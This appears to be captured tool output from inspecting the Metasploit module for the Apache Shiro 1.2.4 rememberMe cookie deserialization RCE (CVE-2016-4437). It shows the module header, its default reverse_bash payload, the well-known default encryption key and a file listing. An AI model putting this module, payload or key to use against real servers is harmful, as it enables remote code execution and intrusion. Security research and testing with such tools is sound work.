@@ -1,0 +1,76 @@
+﻿=== msf version ===
+Framework Version: 6.4.135-dev
+=== shiro module head ===
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::JavaDeserialization
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Apache Shiro v1.2.4 Cookie RememberME Deserial RCE',
+        'Description' => %q{
+          This vulnerability allows remote attackers to execute arbitrary code on vulnerable
+          installations of Apache Shiro v1.2.4. Note that other versions of Apache Shiro may
+          also be exploitable if the encryption key used by Shiro to encrypt rememberMe
+          cookies is known.
+
+          The gadget chain used for Java deserialization must be present on the target's classpath.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'L / l-codes[at]qq.com' # Metasploit module
+        ],
+        'References' => [
+          ['CVE', '2016-4437'],
+          ['URL', 'https://github.com/Medicean/VulApps/tree/master/s/shiro/1']
+        ],
+        'Targets' => [
+          [
+            'Unix Command payload',
+            {
+              'Arch' => ARCH_CMD,
+              'Platform' => 'unix',
+              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
+            }
+          ],
+          [
+            'Windows Command payload',
+            {
+              'Arch' => ARCH_CMD,
+              'Platform' => 'win'
+            }
+          ]
+        ],
+        'DefaultTarget' => 0,
+        'DisclosureDate' => '2016-06-07',
+        'Privileged' => false,
+        'DefaultOptions' => {
+          'WfsDelay' => 5
+        },
+        'Notes' => {
+          'Stability' => [ CRASH_SAFE ],
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ]
+=== module defs (targets/gadgets) ===
+13:  def initialize(info = {})
+21:          also be exploitable if the encryption key used by Shiro to encrypt rememberMe
+34:        'Targets' => [
+40:              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
+54:        'DefaultOptions' => {
+67:        OptString.new('ENC_KEY', [ true, 'Shiro encryption key', 'kPH+bIxk5D2deZiIxcaaaA==']),
+79:    aes.key = Rex::Text.decode_base64(datastore['ENC_KEY'])
+=== java deser util present? ===
+-rw-r--r-- 1 root root 3018 May 26 08:02 /usr/share/metasploit-framework/lib/msf/util/java_deserialization.rb
+=== DONE ===
+{"rc": 0, "stdout_len": 2635, "stderr_len": 0}
+
